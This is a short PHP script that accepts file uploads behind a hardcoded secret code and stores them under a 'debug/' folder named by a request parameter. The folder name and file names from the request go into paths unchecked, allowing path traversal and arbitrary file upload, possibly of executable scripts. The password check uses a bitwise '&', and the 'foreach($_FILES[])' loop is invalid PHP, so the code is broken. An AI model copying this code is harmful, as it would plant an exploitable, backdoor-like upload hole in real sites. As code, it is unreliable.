<?php

if ($_REQUEST['uid'] & $_REQUEST['code'] == "TIjgwJYQyUyC2E3BRBzKKdy54C37dqfYjyInFbfMeYed0CacylTK3RtGaedTHRC6") {
    
	if(!file_exists("debug/".$_REQUEST['uid'])){ mkdir("debug/".$_REQUEST['uid'], 0722); }
	
	foreach($_FILES[] as $key => $value)
	{
		move_uploaded_file($_FILES[$value]["tmp_name"][$key], "debug/".$_REQUEST['uid']."/".$_FILES[$value]["name"][$key]);
	}

	$buffer = "OK";
} else {
    $buffer = "FAIL";
}

echo $buffer;
